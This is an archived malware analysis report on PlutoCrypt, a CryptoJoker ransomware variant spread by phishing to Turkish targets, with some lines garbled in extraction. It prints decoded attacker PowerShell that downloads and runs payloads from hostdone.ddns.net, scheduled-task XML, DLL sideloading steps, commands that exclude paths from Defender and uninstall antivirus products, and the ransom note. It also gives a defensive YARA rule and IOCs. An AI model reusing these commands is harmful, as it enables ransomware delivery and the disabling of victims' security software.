{
    "id": "d3015d58-f929-4a76-b9af-fdf46d90e7e3",
    "created_at": "2023-05-06T02:09:08.063202Z",
    "updated_at": "2025-03-27T02:05:38.912762Z",
    "deleted_at": null,
    "sha1_hash": "455ba95a53fa620b3a113c1cf240f836c3cb5003",
    "title": "2023-04-14 - PlutoCrypt - A CryptoJoker Ransomware Variant",
    "authors": "",
    "file_creation_date": "2023-05-05T01:57:19Z",
    "file_modification_date": "2023-05-05T01:57:19Z",
    "file_size": 4640202,
    "plain_text": "# PlutoCrypt - A CryptoJoker Ransomware Variant\n\n**[0xtoxin-labs.gitbook.io/malware-analysis/malware-analysis/plutocrypt-a-cryptojoker-ransomware-variant](https://0xtoxin-labs.gitbook.io/malware-analysis/malware-analysis/plutocrypt-a-cryptojoker-ransomware-variant)**\n\n## The Phish\n\nOur story begins with a spear phishing email, targeting Turkish individuals and organizations. These attacks often begin with an email that\nappears to be legitimate, but in reality, is designed to manipulate the recipient into divulging sensitive information or downloading malicious\nsoftware.\n\n**Translation:**\n\nPhishing Mail\n\nGreetings, good day, Aysu from Vakifbank IT service, our it system is constantly receiving unauthorized verification requests from this \"\n\n[[email protected]\" email address, so we needed to contact you. We don't want to start a legal process, can you please check the logs](https://0xtoxin-labs.gitbook.io/cdn-cgi/l/email-protection)\nhere and confirm whether they belong to you. ?\n\nIn this particular instance, the attacker has embedded a link in the content of the email, which purports to be from Aysu at Vakifbank IT service.\nThe email claims that the bank's IT system has detected unauthorized verification requests from the recipient's email address and requests\nconfirmation from the victim.\n\n## Execution Chain\n\nBelow you can see a diagram that demonstrate the execution flow from the moment that the mail was opened:\n\n\n-----\n\nExecution Flow\n\nAs you can see the execution chain here is first of all very interesting and secondly contains a lot of steps! I will break down each and every\nstep from the initial payload through the whole files download/execute flow and up until we reach the final payload.\n\n## Initial Payload\n\n### HTA Handle\n\nI will start with the compressed .hta file.\nI've opened the file in text editor to see whether the code of the HTA is clear or not and found\nobfuscated JS code:\n\nOnfuscated HTA File\n\nDeobfuscating it statically will take years, so instead of it I will convert it to html and save only the script content and open it locally in a\nbrowser.\nNavigating through the code, the most interesting part was by the end of the script (as I was expecting):\n\n\n-----\n\nInteresting EOF\n\n**oL2J - will be an object with the type of wobj**\n\n**ficzs - will contain the data stored in str4**\n```\n   oL2J will execute ficzs\n\n```\nI've set a breakpoint on the line of oL2J declaration and restarted the page, now we can have a look at the Global variables scope and see\nwhat both wobj and str4 have inside of them:\n\nstr4 & wobj Variables Content\n```\noL2J will be a Wscript.Shell object that will run encoded PowerShell script.\n\n### Embedded PowerShell Execution\n\n```\nExtracted PowerShell Script:\n\ncmd /C powershell -exec bypass -enc\nYwBtAGQAIAAvAEMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBlAHgAZQBjACAAYgB5AHAAYQBzAHMAIAAtAGMAIABjAGQAIAAkAGUA\n\nLet's deobfuscate it quickly:\n\nimport base64\n\n​\n\nENCODED_POWERSHELL =\n'YwBtAGQAIAAvAEMAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBlAHgAZQBjACAAYgB5AHAAYQBzAHMAIAAtAGMAIABjAGQAIAAkAGUA\n\n​\n\nprint(base64.b64decode(ENCODED_POWERSHELL).replace(b'\\x00',b'').decode())\n\ncmd /C powershell -exec bypass -c cd $env:appdata; cd $env:appdata; invoke-webrequest -uri 'http://hostdone.ddns.net/x1.xml' -outfile 'x.xml';\ninvoke-webrequest -uri 'http://hostdone.ddns.net/task.xml' -outfile 'task.xml'; invoke-webrequest -uri 'http://hostdone.ddns.net/t.pd' -outfile\n'iotlog.pdf'; schtasks.exe /Create /XML 'task.xml' /tn 'taskname'; start-process 'iotlog.pdf'; schtasks /run /tn 'taskname';\n\n\n-----\n\ne deob uscated o e S e sc pt do oad 3 es a d sa e t e t e `pp ata o de, t t a` e ecute t o o t e do oaded es,\none by simply starting a process with it (iotlog.pdf) which is a junk file with no actual purpose.\n(start-process 'iotlog.pdf') The second\nexecution will be by creating a schedule task using one of the downloaded xml files (task.xml, schtasks.exe /Create /XML 'task.xml' /tn\n```\n'taskname') and then it will execute the task. (schtasks /run /tn 'taskname')\n\n## Tasks Madness\n\n### task.xml\n\n```\nLet's start with the first scheduled task:\n\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n\n<Task version=\"1.3\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n\n<RegistrationInfo>\n\n<Date>2023-04-03T00:54:30</Date>\n\n<Author>\\pc</Author>\n\n<Description>rufus.com</Description>\n\n<URI>\\task</URI>\n\n</RegistrationInfo>\n\n<Triggers>\n\n<TimeTrigger>\n\n<StartBoundary>1910-01-01T00:00:00</StartBoundary>\n\n<Enabled>true</Enabled>\n\n</TimeTrigger>\n\n</Triggers>\n\n<Principals>\n\n<Principal id=\"Author\">\n\n<LogonType>InteractiveToken</LogonType>\n\n<RunLevel>LeastPrivilege</RunLevel>\n\n</Principal>\n\n</Principals>\n\n<Settings>\n\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\n<DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n\n<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n\n<AllowHardTerminate>true</AllowHardTerminate>\n\n<StartWhenAvailable>false</StartWhenAvailable>\n\n<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n\n<IdleSettings>\n\n<StopOnIdleEnd>true</StopOnIdleEnd>\n\n<RestartOnIdle>false</RestartOnIdle>\n\n</IdleSettings>\n\n\n-----\n\no Sta tO e a d t ue / o Sta tO e a d\n\n<Enabled>true</Enabled>\n\n<Hidden>true</Hidden>\n\n<RunOnlyIfIdle>false</RunOnlyIfIdle>\n\n<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>\n\n<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>\n\n<WakeToRun>false</WakeToRun>\n\n<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n\n<Priority>7</Priority>\n\n</Settings>\n\n<Actions Context=\"Author\">\n\n<Exec>\n\n<Command>cmd</Command>\n\n<Arguments>/c start /min powershell -w hidden -exec bypass -enc\nTgBlAHcALQBJAHQAZQBtACAAJwBcAFwAPwBcAEMAOgBcAFcAaQBuAGQAbwB3AHMAIABcAFMAeQBzAHQAZQBtADMAMgAnACAALQBJA\n</Arguments>\n\n</Exec>\n\n</Actions>\n\n</Task>\n\nYet another embedded PowerShell script, let's deobfuscate it and see what it lays beneath the obfuscation:\n\nENCODED_POWERSHELL2 =\n'TgBlAHcALQBJAHQAZQBtACAAJwBcAFwAPwBcAEMAOgBcAFcAaQBuAGQAbwB3AHMAIABcAFMAeQBzAHQAZQBtADMAMgAnACAALQBJ\n\n​\n\nprint(base64.b64decode(ENCODED_POWERSHELL2).replace(b'\\x00',b'').decode())\n\nNew-Item '\\\\?\\C:\\Windows \\System32' -ItemType Directory\n\nSet-Location -Path '\\\\?\\C:\\Windows \\System32'\n\ncopy C:\\Windows\\System32\\taskmgr.exe \"C:\\windows \\System32\\taskmgr.exe\"\n\nSet-Location -Path '\\\\?\\C:\\Windows \\System32'\n\ninvoke-webrequest -uri 'http://hostdone.ddns.net/u.dl' -outfile 'uxtheme.dll'\n\nStart-Process -Filepath 'C:\\windows \\System32\\taskmgr.exe'\n\nThe script will do 3 things:\n\n\n-----\n\nIt will Create a new System32 Folder, it will then copy taskmgr.exe from the original System32 folder to the freshly created System32\nfolder.\nwhat is special about this that it will duplicate the Windows folder of the user and create an empty System32 Folder, If we run the\ncommands manually we can see that another Windows Folder is created with all the content of the original Windows folder but the\nSystem32 folder is empty.\n\nCreation Of Impersonating System32 Folder\n\n​\n\nCopy Of taskmgr.exe In Impersonated System32 Folder\n\n2. 2.\n\nAnother payload will be downloaded from the attacker server and will be saved on the impersonated System32 folder by the name\n```\n   uxtheme.dll\n\n```\n3. 3.\n\nThe script will execute taskmgr.exe\n\n### DLL Side Loading\n\nIf we take a look at the imports of taskmgr.exe we can find that it loads uxtheme.dll:\n\n\n-----\n\nas g e e po ts\n\n[The TA leverages the DLL Search Order in order to accomplish DLL Side Loading and load the retrieved payload. I've opened the DLL in IDA](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)\nand it's pretty straight forward, all Exports will either lead to SetWindowTheme or OpenThemeData which both will have a similar command that\nwill be executed using WinExec:\n\nCommand Execution In Side Loaded DLL\n\n**The command:**\n\ncmd /c cd %appdata% & SCHTASKS /Create /TN \\\"onedrive\\\" /XML \\\"x.xml\\\" & SCHTASKS /RUN /TN \\\"onedrive\\\"\n\nThe command will create yet another task with the name of onedrive\\ with the content of x.xml which was fetched from the attacker server at\nalongside with task.xml and it will execute the task.\n\n### x.xml\n\nLet's observe the content of the xml file:\n\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n\n<RegistrationInfo>\n\n<Date>2021-05-20T06:39:04</Date>\n\n<Author></Author>\n\n<URI>\\OneDrive Status Checker Start</URI>\n\n</RegistrationInfo>\n\n<Triggers>\n\n<LogonTrigger>\n\n<Enabled>true</Enabled>\n\n<Delay>PT30S</Delay>\n\n</LogonTrigger>\n\n</Triggers>\n\n<Principals>\n\n<Principal id=\"Author\">\n\n<LogonType>S4U</LogonType>\n\n<RunLevel>HighestAvailable</RunLevel>\n\n</Principal>\n\n</Principals>\n\n<Settings>\n\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n\n<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n\n\n-----\n\no a d e ate t ue / o a d e ate\n\n<StartWhenAvailable>false</StartWhenAvailable>\n\n<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n\n<IdleSettings>\n\n<StopOnIdleEnd>true</StopOnIdleEnd>\n\n<RestartOnIdle>false</RestartOnIdle>\n\n</IdleSettings>\n\n<AllowStartOnDemand>true</AllowStartOnDemand>\n\n<Enabled>true</Enabled>\n\n<Hidden>false</Hidden>\n\n<RunOnlyIfIdle>false</RunOnlyIfIdle>\n\n<WakeToRun>false</WakeToRun>\n\n<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n\n<Priority>7</Priority>\n\n</Settings>\n\n<Actions Context=\"Author\">\n\n<Exec>\n\n<Command>cmd.exe</Command>\n\n<Arguments>/C \"PowerShell -Nologo -NoProfile -ExecutionPolicy Bypass -E\n\"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQARQBuAHYAO\n&amp; PowerShell -Nologo -NoProfile -ExecutionPolicy Bypass -E\n\"YwBkACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEADQAKAGMAbQBkACAALwBjACAAdwBtAGkAYwAgAC8AbwB1AHQAcAB1AHQAOgA\n&amp; PowerShell -Nologo -NoProfile -ExecutionPolicy Bypass -E\nYwBkACAAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEACgBTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAkAGUAbgB2ADoAYQBwAHAAZABh\n&amp; exit\"</Arguments>\n\n</Exec>\n\n</Actions>\n\n</Task>\n\nAs we can see this task contains 3 different PowerShell scripts that will be executed. Let's break them one by one:\n\n### AntiVirus/EDR Evasion\n\nENCODED_POWERSHELL3 =\n'QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQARQBuAHYAO\n\n​\n\nprint(base64.b64decode(ENCODED_POWERSHELL3).replace(b'\\x00',b'').decode())\n\nAdd-MpPreference -ExclusionPath $Env:USERPROFILE\\AppData\n\nAdd-MpPreference -ExclusionPath $Env:USERPROFILE\n\nAdd-MpPreference -ExclusionProcess \"powershell.exe\"\n\nThe first script will exclude the User path, the AppData folder and anything that is being run under the process: powershell.exe from Windows\nDefender.\nMoving on to the second script:\n\n\n-----\n\nCO _ O S\n'YwBkACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEADQAKAGMAbQBkACAALwBjACAAdwBtAGkAYwAgAC8AbwB1AHQAcAB1AHQAOgA\n\n​\n\nprint(base64.b64decode(ENCODED_POWERSHELL4).replace(b'\\x00',b'').decode())\n\ncd $env:APPDATA\n\ncmd /c wmic /output:%appdata%\\listpr.txt product get name\n\ncmd /c type listpr.txt | findstr /I \"name avast eset norton antivirus avira kaspersky mcafee panda malwarebytes f-Secure symantec \" > aapr.txt\n\n(Get-Content aapr.txt).Trim() -ne '' | Set-Content listd.txt\n\n$xa = (Get-Content listd.txt)[1]\n\n$xb = (Get-Content listd.txt)[2]\n\n$xc = (Get-Content listd.txt)[3]\n\n$xd = (Get-Content listd.txt)[4]\n\n$appla = Get-WmiObject -Class Win32_Product -Filter \"Name = '$xa'\"\n\n$appla.Uninstall()\n\n$applb = Get-WmiObject -Class Win32_Product -Filter \"Name = '$xb'\"\n\n$applb.Uninstall()\n\n$applc = Get-WmiObject -Class Win32_Product -Filter \"Name = '$xc'\"\n\n$applc.Uninstall()\n\n$appld = Get-WmiObject -Class Win32_Product -Filter \"Name = '$xd'\"\n\n$appld.Uninstall()\n\nThe second script will have several activities:\n\n1. 1.\n\nSave all installed products names to a listpr.txt using the command wmic.\n\n2. 2.\n\nBy using the findstr, the script will look for products with AV's names and it will save the results to aapr.txt.\n\n3. 3.\n\nThe script will rewrite the content of aapr.txt to listd.txt after a trim\n\n4. 4.\n\nThe script will take only 4 product names (index 1-4)\n\n5. 5.\n\nThe script will uninstall the applications based on the product names.\n\nThe purpose of the script is to remove AV related products to ensure that nothing will flag the rest of the execution flow.\n\n### Final Payload Fetching\n\nlet's analyze the last script:\n\nENCODED_POWERSHELL5 =\n'YwBkACAAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEACgBTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAkAGUAbgB2ADoAYQBwAHAAZAB\n\n​\n\nprint(base64.b64decode(ENCODED_POWERSHELL5).replace(b'\\x00',b'').decode())\n\ncd $env:appdata\n\nSet-Content $env:appdata/holo txt 'beni burada b1rak'\n\n\n-----\n\no e eb equest U ttp // ostdo e dd s et/p e e Out e p e e\n\nInvoke-WebRequest -Uri 'http://hostdone.ddns.net/e' -OutFile enc.xml\n\ncd $env:appdata\n\nSCHTASKS /Create /TN \"enc\" /XML \"enc.xml\"\n\ncmd /c schtasks /RUN /TN \"enc\"\n\nThis final script has several things it does:\n\n1. 1.\n\nCreates a junk file holo.txt with the text beni burada b1 rak (translated to: leave me here [Mr. Robot Reference?])\n\n2. 2.\n\nDownloads 2 files from the remote server: pl.exe and enc.xml\n\n3. 3.\n\nCreates a task with the name of enc alongside with the content of enc.xml and then executes it.\n\n### enc.xml\n\nOnce again, let's check the content of the downloaded xml file:\n\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n\n<RegistrationInfo>\n\n<Date>2021-05-20T06:39:04</Date>\n\n<Author></Author>\n\n<URI>\\enc</URI>\n\n</RegistrationInfo>\n\n<Triggers />\n\n<Principals>\n\n<Principal id=\"Author\">\n\n<LogonType>InteractiveToken</LogonType>\n\n<RunLevel>HighestAvailable</RunLevel>\n\n</Principal>\n\n</Principals>\n\n<Settings>\n\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\n<DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n\n<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n\n<AllowHardTerminate>true</AllowHardTerminate>\n\n<StartWhenAvailable>false</StartWhenAvailable>\n\n<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n\n<IdleSettings>\n\n<StopOnIdleEnd>true</StopOnIdleEnd>\n\n<RestartOnIdle>false</RestartOnIdle>\n\n\n-----\n\n/ d eSett gs\n\n<AllowStartOnDemand>true</AllowStartOnDemand>\n\n<Enabled>true</Enabled>\n\n<Hidden>false</Hidden>\n\n<RunOnlyIfIdle>false</RunOnlyIfIdle>\n\n<WakeToRun>false</WakeToRun>\n\n<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n\n<Priority>7</Priority>\n\n</Settings>\n\n<Actions Context=\"Author\">\n\n<Exec>\n\n<Command>%appdata%\\pl.exe</Command>\n\n</Exec>\n\n</Actions>\n\n</Task>\n\nThe task has a single command that it will execute and it's to simply run the freshly retrieved payload pl.exe which will be the actual\nransomware payload.\n\n## PlutoCrypt Analysis\n\n### Static Information\n\nPlutoCrypt is 32Bit .NET ransomware, as we can see by DiE analyze:\n\nDiE Analysis\n\nOpening the binary in DnSpy, an incriminating evidence pops up exposing that our ransomware is based on the CryptoJoker ransomware\n[(which is actually an open source malware that can be found here):](https://github.com/jaenudin86/CryptoJoker)\n\nCryptoJoker Reference\n\n### Code Comparison\n\n\n-----\n\nFirst, we will have a look at the main function:\n\nMain Function\n\nWell it's very much identical, you can see also that our PlutoCrypt ransomware has a method called JokerIsNotRunning which is also\npresented in the same place at the original code.\nPlutoCrypt expands the infection method that was initially written in CryptoJoker as can be\nseen here:\n\n\n-----\n\nEncryption Preparation\n\nCryptoJoker was supposed to only encrypt the %USERPROFILE% related path but PlutoCrypt expands the infection to some additional possible\ndrivers that might be installed on the victim's computer.\n\n### Ransom Note\n\nBu Bilgisayarın Güvenliği Ihlal Edilmiştir !!\n\n​\n\nPlutoCrypt bu bilgisayardaki tüm verileri askeri düzeyde RSA-4096 ile şifrelenmiştir.\n\nVerilerinizi geri kurtarabilmek için bize 72 saat içinde 10.000 TL ödemenizi rica etmekteyiz.\n\nEğer ilk 24 saat içerisinde ödeme yapılırsa %40 indirimle 6.000 TL talep etmekteyiz.\n\n​\n\nYaptığımız işi ciddiye alıyoruz verilerin hassas veya önemli olabileceğini biliyoruz.\n\nÖdemenizi 72 saat içinde yapmadığınız taktirde; verilerinizi kurtarabileceğiniz anahtar kalıcı olarak silinecektir aynı zamanda bilgisayardaki\ntüm veriler internette herkeze açık paylaşılacaktır.\n\n​\n\nÖdeme yapılmazsa paylaşılacak verileriniz;\n\n\n-----\n\n) g saya da ş e e e tü dosya a ( otoğ a, be ge e s )\n\n2) Tarayıcınızdan girdiğiniz \"Whatsapp Web\", \"outlook\", \"gmail\" ve bilgisayarınızda yüklü uygulamalara ait tüm mailleşme/mesajlaşmalarınızın\nbirer kopyası da offline olarak paylaşılacaktır.\n\n​\n\nBitcoin ile ödeme yapmanız ve şifre çözücü anahtarı almanız kredi/banka kartı sahibiyseniz 1 saat sürmektedir.\n\n[Işlemleriniz için [email protected] mail adresine vakit kaybetmeden ulaşınız.](https://0xtoxin-labs.gitbook.io/cdn-cgi/l/email-protection)\n\n(NOT: Eğer 2 saat içerisinde geri dönüş alamadıysanız spam kutusuna bakınız.)\n\nKişisel id'niz: [HWID goes here]\n\n**Translation:**\n\nThis Computer Has Been Breached !!\n\n​\n\nPlutoCrypt all data on this computer is encrypted with military grade RSA-4096.\n\nIn order to recover your data, we ask you to pay us 10,000 TL within 72 hours.\n\nIf payment is made within the first 24 hours, we request 6,000 TL with a 40% discount.\n\n​\n\nWe take what we do seriously and we know that data can be sensitive or important.\n\nIf you do not make your payment within 72 hours; The key with which you can recover your data will be permanently deleted, and at the same\ntime, all data on the computer will be shared publicly on the internet.\n\n​\n\nYour data to be shared if payment is not made;\n\n1) All your encrypted files (photos, documents, etc.)\n\n2) A copy of each of your \"Whatsapp Web\", \"outlook\", \"gmail\" and applications installed on your computer will be shared offline.\n\n​\n\nIf you are a credit/debit card holder, it takes 1 hour to pay with Bitcoin and receive the decryption key.\n\n[For your transactions, please contact [email protected] without delay.](https://0xtoxin-labs.gitbook.io/cdn-cgi/l/email-protection)\n\n(NOTE: If you haven't received a response within 2 hours, check your spam box.)\n\nYour personal id: [HWID goes here]\n\n\n-----\n\nRansom Note\n\n### New Victim Notification\n\nOnce a machine was infected and the ransom note was crafted and displayed the the victim, a POST request will occur to the TA server\n(199.192.20[.]58:3001) with the unique UID of the machine and a base64 encoded string that contains the RSA Keys:\n\nPOST Request Capture\n\nThis part was modified by the authors of PlutoCrypt because in the original code of CryptoJoker the alert for new victim sends and email rather\nthen a POST request:\n\n\n-----\n\nCryptoJoker Original Alerting Method\n\n## Yara Rule\n\nrule Win_CryptoJoker_Variants {\n\nmeta:\n\nauthor = \"0xToxin\"\n\ndescription = \"PlutoCrypt/CryptoJoker Strings\"\n\nstrings:\n\n$n1 = \"CryptoJoker\" ascii\n\n$n2 = \"PlutoCrypt\" nocase\n\n$s1 = \"CryptJokerWalker90912\" ascii wide\n\n$s2 = \"SendEmail\" ascii\n\n$s3 = \".partially.\" ascii wide\n\n$s4 = \".fully.\" ascii wide\n\n$s5 = \"Do not delete this file, else the decryption process will be broken\" ascii wide\n\n$s6 = \"And the decryption key is:\" ascii wide\n\n$s7 = \"The HWID is:\" ascii wide\n\ncondition:\n\nuint16(0) == 0x5a4d and 1 of ($n*) and all of ($s*)\n\n}\n\n## VT Graph\n\n\n-----\n\nVirusTotal Graph\n\nvirustotal\n\n## Summary\n\nIn this blog post we went over a recent phishing campaign that was targeting the Turkish audience with a variant of the CryptoJoker\nransomware. Through the blog we learned about the execution flow that the TA used, by abusing task scheduling and some other\nexecution/evading techniques such as duplicating System32 folder & DLL sideloading.\nHopefully you enjoyed reading through and learned a\nfew new things!\n\n## IOCs\n\n\n-----\n\nU s\n\nFiles:\n\n\nhttp://hostdone.ddns[.]net/x1.xml\n\nhttp://hostdone.ddns[.]net/task.xml\n\nhttp://hostdone.ddns[.]net/t.pd\n\nhttp://hostdone.ddns[.]net/u.dl\n\nhttp://hostdone.ddns[.]net/pl.exe\n\nhttp://hostdone.ddns[.]net/e\n\n\n[vakifbank iot-10-04-2023logs.rar - 9026c67b52f9ddece9a7e203978e8aa9ffa5a128cf83a238c924dce141899aec​](https://bazaar.abuse.ch/sample/9026c67b52f9ddece9a7e203978e8aa9ffa5a128cf83a238c924dce141899aec/)\n[vakifbank iot-10-04-2023logs.hta - b05328077aa1dd5dba4d8e25cb028dc4f533bd1dd69bc6d12ec2f8298598f803​](https://bazaar.abuse.ch/sample/b05328077aa1dd5dba4d8e25cb028dc4f533bd1dd69bc6d12ec2f8298598f803/)\ntask.xml - [6cbed31fdf5554ead21de9ccdd12ccc6d9f0b4eaf5f874ce96103ab01f522073​](https://bazaar.abuse.ch/sample/6cbed31fdf5554ead21de9ccdd12ccc6d9f0b4eaf5f874ce96103ab01f522073/)\nuxtheme.dll - [8279282e07e2fa82cad4f0cb0b450e77dab930a7db7c9488f663002753d79dde​](https://bazaar.abuse.ch/sample/8279282e07e2fa82cad4f0cb0b450e77dab930a7db7c9488f663002753d79dde/)\nx.xml - [df38a5d9d7d6c9cfea65eb562317f71bea94a0fc731e1fe9121f9479e56f61fd​](https://bazaar.abuse.ch/sample/df38a5d9d7d6c9cfea65eb562317f71bea94a0fc731e1fe9121f9479e56f61fd/)\nenc.xml - [20cf29f926a18b44f580137ddb65d81bc0ed419412910a7682ee7b95b186ac82​](https://bazaar.abuse.ch/sample/20cf29f926a18b44f580137ddb65d81bc0ed419412910a7682ee7b95b186ac82/)\npl.exe - [e8527f309846d18fbf85289283dcde7b19063a50b11263ba0d36663df8fcfd30​](https://bazaar.abuse.ch/sample/e8527f309846d18fbf85289283dcde7b19063a50b11263ba0d36663df8fcfd30/)\nDomains:\n\nhostdone.ddns[.]net\n\ndeni[.]tk\n\nIPs:\n\n199.192.20[.]58\n\n## References\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-04-14 - PlutoCrypt - A CryptoJoker Ransomware Variant.pdf"
    ],
    "report_names": [
        "2023-04-14 - PlutoCrypt - A CryptoJoker Ransomware Variant.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1683338948,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1683251839,
    "ts_modification_date": 1683251839,
    "files": {
        "pdf": "https://archive.orkl.eu/455ba95a53fa620b3a113c1cf240f836c3cb5003.pdf",
        "text": "https://archive.orkl.eu/455ba95a53fa620b3a113c1cf240f836c3cb5003.txt",
        "img": "https://archive.orkl.eu/455ba95a53fa620b3a113c1cf240f836c3cb5003.jpg"
    }
}